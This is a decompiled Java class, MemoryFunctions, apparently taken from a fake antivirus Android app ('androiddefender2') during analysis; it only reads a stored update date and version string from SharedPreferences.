package com.worker.androiddefender2;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MemoryFunctions {
  private static final int MODE_PRIVATE = 0;
  
  @SuppressLint({"SimpleDateFormat"})
  public String getUpdateDate(Context paramContext) {
    Date date = new Date();
    SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yyyy");
    SharedPreferences sharedPreferences = paramContext.getSharedPreferences("Updates", 0);
    return sharedPreferences.contains("date_last_update") ? sharedPreferences.getString("date_last_update", simpleDateFormat.format(date)) : simpleDateFormat.format(date);
  }
  
  public String getUpdateVersionInfo(Context paramContext) {
    SharedPreferences sharedPreferences = paramContext.getSharedPreferences("Updates", 0);
    return sharedPreferences.contains("versionbase") ? sharedPreferences.getString("versionbase", "10.0.0.1") : "10.0.0.1";
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/MemoryFunctions.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */